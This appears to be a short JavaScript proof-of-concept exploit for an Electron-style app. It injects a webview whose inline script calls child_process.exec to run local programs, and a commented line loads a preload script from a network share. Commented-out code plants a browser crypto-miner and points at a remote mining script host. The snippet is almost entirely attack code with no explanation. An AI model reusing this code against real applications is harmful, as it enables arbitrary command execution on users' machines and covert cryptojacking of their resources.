//<webview id="foo" style="display:inline-flex; width:640px; height:480px" src="data:text/html,<script>require('child_process').exec('xdg-open http://www.github.com',function(){})</script>" preload="file:\\192.168.1.11\temp\test.js"></webview>

var s = document.createElement('webview');
s.src = "data:text/html,<script>require('child_process').exec('intellij-idea-ultimate-edition',function(){})</script>"
//adblocked
//s.src = 'https://www.hostingcloud.racing/0Tlx.js'

document.body.append(s)
/*
var s2 = document.createElement('script');
s2.type = 'text/javascript'
s2.innerText = "var miner = new Client.Anonymous('<site-key>');\nminer.start();"
document.body.append(s2)
*/
